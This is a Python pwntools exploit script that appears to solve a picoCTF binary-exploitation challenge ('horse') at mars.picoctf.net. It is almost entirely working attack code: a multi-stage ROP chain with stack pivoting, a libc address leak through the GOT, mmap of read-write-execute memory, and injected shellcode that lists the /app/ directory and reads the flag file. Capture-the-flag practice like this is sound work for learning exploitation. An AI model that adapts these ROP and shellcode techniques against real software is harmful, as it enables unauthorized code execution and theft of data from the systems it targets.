#!/usr/bin/env python3

from pwn import *
import time
import re
exe = ELF("horse")

context.binary = exe
context.terminal = "kitty"

pop_rdi = 0x0000000000400c03
pop_rsi_r15 = 0x0000000000400c01
pop_rsp_r13_r14_r15 = 0x0000000000400bfd

offset_read = 0x0000000000111130
offset_mmap = 0x000000000011ba20

def conn():
    if args.REMOTE:
        return remote("mars.picoctf.net", 31809)
    elif args.GDB:
        return gdb.debug([exe.path],gdbscript="b *main+58\nc\nni 3\nfin\nni 5\nfin\nni 10\nfin\nni 5\nfin\nni 20\nfin\nni 3\nfin\nni 5")
    else:
        return process([exe.path])


def main():
    r = conn()


    # call strlen to get big number in rdx (i didn't bother to look at the source i just know it works lol)
    # read a second, larger ROP chain into writable program memory
    # pivot onto that program memory
    payload = b"A" * 40
    payload += p64(pop_rdi)  + p64(0x400ce0) + p64(exe.symbols['strlen'])
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi_r15) + p64(0x602000) + p64(0)
    payload += p64(exe.symbols['read'])
    payload += p64(pop_rsp_r13_r14_r15) + p64(0x602000)
    r.send(payload)
    r.recvuntil("/     /   ")
    r.recvline()


    # leak libc base by writing GOT
    # call read again so we can write another ROP chain with libc gadgets
    # pivot stack onto our new chain


    payload = b"A" * 24 # need padding bc our stack pivot gadget has three pops between pop rsp and ret
    payload += p64(pop_rdi) + p64(1)
    payload += p64(pop_rsi_r15) + p64(exe.got["read"]) + p64(0)
    payload += p64(exe.symbols['write'])
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi_r15) + p64(0x6020c0) + p64(0)
    payload += p64(exe.symbols['read'])
    payload += p64(pop_rsp_r13_r14_r15) + p64(0x6020c0)
    payload += p64(0)
    r.sendline(payload)
    read_address = u64(r.recv(8))
    libc_base = read_address - offset_read
    log.info("leaked libc_base: " + hex(libc_base))


    # libc lets us control rdx and rcx, so that gets us the first four args
    # let's take advantage of our new argument control to mmap some executable memory
    # we're not mapping a file so we don't really care much about the last two argument regs


    pop_rdx_r12 = libc_base + 0x000000000011c371
    pop_rcx = libc_base + 0x000000000009f822

    payload = b"A" * 24 # need padding bc our stack pivot gadget has three pops between pop rsp and ret
    payload += p64(pop_rdi) + p64(0x10000)
    payload += p64(pop_rsi_r15) + p64(0x100000) + p64(0)
    payload += p64(pop_rdx_r12) + p64(7) + p64(0) # PROT_READ | PROT_WRITE | PROT_EXEC
    payload += p64(pop_rcx) + p64(0x22) # MAP_PRIVATE | MAP_ANONYMOUS
    payload += p64(libc_base + 0x00000000000c9ccf) # xor r9d, r9d
    payload += p64(libc_base + offset_mmap)

    # we now have rwx memorable at a predictable address
    # lets read some shellcode onto it and then return

    payload += p64(pop_rdi)  + p64(0x400ce0) + p64(exe.symbols['strlen'])
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi_r15) + p64(0x0000000000010000) + p64(0)
    payload += p64(exe.symbols['read'])
    payload += p64(0x10000)
    r.send(payload)

    r.recv(0x10000) # clean stdout


    # get files in directory
    # don't really need to bother parsing it
    # can just print the whole thing and regex the filename out
    # lastly, read again so we can write shellcode with the filename

    payload = b""
    payload += asm(shellcraft.open("/app/"))
    payload += asm(shellcraft.amd64.linux.getdents64(3, 0x100000, 0x1000))
    payload += asm(shellcraft.amd64.linux.write(1, 0x100000, 0x1000))
    payload += asm(shellcraft.amd64.linux.read(0, 0x10000+0x1000, 0x1000))
    payload = payload.ljust(0x1000, b"\x90")
    r.send(payload)

    flag_filename = re.search(b"(flag.*txt)", r.recv(0x1000)).group(0)

    log.info("leaked flag filename: " + flag_filename.decode())

    # lastly, just open/mmap/write the flag filename

    payload = b""
    payload += asm(shellcraft.open(f"/app/{flag_filename.decode()}"))
    payload += asm(shellcraft.amd64.linux.mmap(0x20000,0x100, 1, 2, 4, 0))
    payload += asm(shellcraft.amd64.linux.write(1, "rax", 0x100))
    
    r.send(payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

